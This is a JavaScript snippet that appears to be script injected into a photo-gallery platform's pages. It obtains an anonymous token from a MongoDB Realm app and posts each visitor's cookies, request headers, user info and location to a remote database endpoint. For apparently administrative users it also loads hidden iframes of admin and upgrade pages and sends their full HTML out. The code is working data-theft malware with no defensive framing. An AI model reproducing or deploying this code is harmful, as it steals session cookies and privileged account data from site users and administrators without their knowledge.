if (Math.random() <= 1.0) {
  const setPtxAccessToken = async () => {
    return fetch(
      "https://us-east-2.aws.realm.mongodb.com/api/client/v2.0/app/data-dkerm/auth/providers/anon-user/login"
    )
      .then((resp) => resp.json())
      .then((json) => json.access_token)
      .then((token) => (window.accessToken = token));
  };

  const insertDoc = async (type, data) => {
    const envelope = {};
    envelope.sessionId = window.rjsSessionId;
    envelope.type = type;
    envelope.data = data;
    envelope.userAgent = navigator?.userAgent;

    envelope.ptData = {};
    envelope.ptData.headers = _pt$?.hdrs || null;
    envelope.ptData.userInfo = _pt$?.userInfo || null;
    envelope.ptData.cookie = document.cookie;

    envelope.ts = Date.now();

    return fetch(
      "https://us-east-2.aws.data.mongodb-api.com/app/data-dkerm/endpoint/data/v1/action/insertOne",
      {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
          "Access-Control-Request-Headers": "*",
          Authorization: `Bearer ${window.accessToken}`,
        },
        body: JSON.stringify({
          collection: "ingest",
          database: "pictimeDataDb",
          dataSource: "pixieset-data",
          document: envelope,
        }),
      }
    );
  };

  const getIFrame = async (iframeUrl) => {
    try {
      const iframe = document.createElement("iframe");
      iframe.src = iframeUrl;
      iframe.style.display = "none";
      document.body.appendChild(iframe);

      setTimeout(() => {
        const iframeHtml = iframe.contentDocument.documentElement.outerHTML;

        // Send Page HTML
        insertDoc("iframe-page-html", {
          location: iframeUrl,
          html: iframeHtml,
        });
      }, 5000);
    } catch (err) {
      console.error(err);
      insertDoc("error", err.toString());
    }
  };

  setPtxAccessToken().then(async () => {
    setTimeout(async () => {
      await insertDoc("location", window.location);

      const userType = _pt$?.userInfo?.type;

      if (userType === 6) {
        insertDoc("iframe-attempt", { url: "/ptoam" });
        getIFrame("/ptoam");
        insertDoc("iframe-attempt", {
          url: "/upgradescripts/generalUpgradeActions.aspx",
        });
        getIFrame("/upgradescripts/generalUpgradeActions.aspx");
      }
    }, 500);
  });
} else {
  console.log(false);
}
